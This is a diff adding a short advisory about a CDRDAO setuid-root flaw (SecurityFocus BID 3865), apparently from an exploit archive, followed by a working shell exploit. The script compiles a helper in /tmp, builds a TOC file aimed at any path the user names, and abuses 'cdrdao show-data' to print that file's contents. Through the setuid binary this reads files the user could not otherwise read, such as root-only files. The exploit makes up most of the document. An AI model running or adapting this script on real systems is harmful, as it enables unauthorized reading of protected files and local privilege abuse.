@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/3865/info
+
+CDRDAO is a freely available, open source CD recording software package available for the Unix and Linux Operating Systems. It is maintained by Andreas Mueller.
+
+When CDRDAO saves it's configuration to the .cdrdao file in a user's home directory, the file is saved with root ownership. Additionally, CDRDAO does not check for the previous existence of this file. Since the cdrdao executable is typically installed setuid root, it is possible for a user to create this file as a symbolic link, which could result in the overwriting of root-owned files, or potentially allow the user execute commands as root.
+
+#!/bin/sh
+
+if [ "$1" ]; then
+	cat > /tmp/t.c <<EOF
+#include <stdio.h>
+int     main()
+{
+	int     i;
+	while (fscanf(stdin, "%i", &i) > 0)
+	{
+		printf("%c%c", (i & 0xff00) >> 8, i & 0xff);
+	}
+	return 0;
+}
+EOF
+	cat > /tmp/t.toc <<EOF
+CD_ROM
+TRACK MODE1_RAW
+FILE "$1" 0
+EOF
+	gcc /tmp/t.c -o /tmp/show
+	echo `cdrdao show-data -v 0 --force /tmp/t.toc 2>&1 | grep -v WARNING | sed 's/.*://g' ` | /tmp/show
+	rm -f /tmp/t.c /tmp/show /tmp/t.toc
+else
+	echo "Syntax: $0 filename"
+fi
